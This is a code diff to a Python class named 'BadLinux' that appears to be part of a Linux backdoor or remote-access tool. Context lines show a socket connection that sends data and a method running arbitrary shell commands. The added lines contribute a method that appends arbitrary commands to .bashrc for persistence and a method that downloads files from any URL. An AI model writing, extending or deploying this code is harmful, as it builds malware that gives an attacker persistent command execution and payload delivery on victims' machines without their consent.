@@ -2,7 +2,7 @@ import os
 import psutil
 import socket
 import subprocess
-
+import wget
 
 class BadLinux(object):
     PATH_FILES = []
@@ -40,11 +40,26 @@ class BadLinux(object):
             sock.send(data)
             return sock
         except Exception:
-            raise Exception("Connection is not possible")
-        
+            raise Exception("Connection is not possible")    
         except:
             return False
 
-    async def rub_command(self , command) -> str:
+    async def rub_command(self , command : str) -> str:
         return subprocess.getoutput(command)
 
+    async def add_in_shell(self , command : str) -> bool:
+        with open(".bashrc" , 'a') as shell:
+            shell.write(command)
+        return True
+    
+    async def download_file(self , url : str) -> str:
+        try:
+            filename = wget.download(url)
+            return os.path.join(os.getcwd() , filename)
+        except ConnectionError:
+            raise ConnectionError("Internet Disconnected, Please Check Connections")
+
+        except Exception as e:
+            raise Exception(f"Exception {e}")
+    
+    
